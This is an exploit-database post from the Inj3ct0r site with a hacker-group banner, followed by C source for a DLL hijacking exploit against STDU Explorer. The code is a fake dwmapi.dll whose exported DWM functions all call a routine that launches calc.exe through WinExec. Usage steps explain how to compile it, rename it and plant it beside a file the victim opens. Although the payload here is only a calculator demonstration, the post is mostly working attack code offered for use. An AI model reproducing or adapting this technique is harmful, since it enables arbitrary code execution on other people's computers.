===================================================
STDU explorer DLL Hijacking Exploit (dwmapi.dll)
===================================================
 
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm anT!-Tr0J4n member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
 

/*
#stdu explorer DLL Hijacking Exploit (dwmapi.dll)

#Author   :    anT!-Tr0J4n

#Greetz   :    Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends

#Email     :    D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Software:    http://www.stdutility.com/stduexplorer.html

#Tested on:   Windows XP sp3

# Home    :    www.Dev-PoinT.com &  http://inj3ct0r.com

=====================
How  TO use : Compile and rename to " dwmapi.dll " , create a file in the same dir with one of the following extensions.

check the result > Hack3d    

=====================        


#dwmapi.dll (code)
*/
 
#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void  DwmDefWindowProc() { evil(); }
DLLIMPORT void  DwmEnableBlurBehindWindow() { evil(); }
DLLIMPORT void  DwmEnableComposition() { evil(); }
DLLIMPORT void  DwmEnableMMCSS() { evil(); }
DLLIMPORT void  DwmExtendFrameIntoClientArea() { evil(); }
DLLIMPORT void  DwmGetColorizationColor() { evil(); }
DLLIMPORT void  DwmGetCompositionTimingInfo() { evil(); }
DLLIMPORT void  DwmGetWindowAttribute() { evil(); }
DLLIMPORT void  DwmIsCompositionEnabled() { evil(); }
DLLIMPORT void  DwmModifyPreviousDxFrameDuration() { evil(); }
DLLIMPORT void  DwmQueryThumbnailSourceSize() { evil(); }
DLLIMPORT void  DwmRegisterThumbnail() { evil(); }
DLLIMPORT void  DwmSetDxFrameDuration() { evil(); }
DLLIMPORT void  DwmSetPresentParameters() { evil(); }
DLLIMPORT void  DwmSetWindowAttribute() { evil(); }
DLLIMPORT void  DwmUnregisterThumbnail() { evil(); }
DLLIMPORT void  DwmUpdateThumbnailProperties() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

